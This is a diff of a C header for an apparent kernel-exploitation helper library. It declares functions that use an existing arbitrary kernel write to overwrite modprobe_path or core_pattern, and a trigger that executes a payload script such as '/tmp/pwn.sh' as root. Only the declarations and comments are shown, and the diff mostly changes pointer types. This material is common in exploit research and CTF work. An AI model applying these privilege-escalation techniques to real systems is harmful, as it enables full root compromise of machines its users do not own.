@@ -7,36 +7,28 @@
 // Post-exploitation kernel-overwrite targets.
 //
 // These helpers assume you already have an arbitrary kernel write primitive
-// (e.g. from a UAF → type-confusion → controlled write). They take a write
-// callback and the target offset from kbase (or absolute address).
+// (e.g. from a UAF -> type-confusion -> controlled write). They take a write
+// callback and the target offset from kbase.
 
-// Callback type: write `data` (of `len` bytes) to kernel virtual address `dst`.
-// Returns 0 on success, negative on error.
-typedef int (*kpwn_kwrite_fn)(void *dst, const void *data, size_t len,
+// Callback types: operate on kernel virtual addresses (uint64_t, NOT void*,
+// because kernel addresses are not valid userspace pointers).
+typedef int (*kpwn_kwrite_fn)(uint64_t kaddr, const void *data, size_t len,
                               void *ctx);
+typedef int (*kpwn_kread_fn)(uint64_t kaddr, void *buf, size_t len, void *ctx);
 
-// Overwrite modprobe_path with a user-controlled path (typically a script that
-// reads the flag / opens a root shell). Triggers by executing a file with
-// unknown binfmt (e.g. "\xff\xff\xff\xff" header), which causes the kernel to
-// invoke modprobe_path.
-//
-// modprobe_path_off: offset of modprobe_path from kbase (find via
-//                    `cat /proc/kallsyms | grep modprobe_path`)
+// Overwrite modprobe_path with a user-controlled path.
+// modprobe_path_off: offset of modprobe_path from kbase
 // payload_path: path to the script to execute (must be < 256 bytes)
-int kpwn_overwrite_modprobe(void *kbase, size_t modprobe_path_off,
+int kpwn_overwrite_modprobe(uint64_t kbase, size_t modprobe_path_off,
                             const char *payload_path, kpwn_kwrite_fn write_fn,
                             void *ctx);
 
 // Trigger modprobe_path execution after overwriting it.
-// Creates a dummy file with invalid binfmt header and executes it.
 int kpwn_trigger_modprobe(const char *dummy_path);
 
 // Overwrite core_pattern to execute a payload when a process crashes.
-// The core_pattern string starts with "|" to pipe the core dump to a program.
-//
-// core_pattern_off: offset of core_pattern from kbase
 // payload_cmd: the command string (e.g. "|/tmp/pwn.sh")
-int kpwn_overwrite_core_pattern(void *kbase, size_t core_pattern_off,
+int kpwn_overwrite_core_pattern(uint64_t kbase, size_t core_pattern_off,
                                 const char *payload_cmd,
                                 kpwn_kwrite_fn write_fn, void *ctx);
 
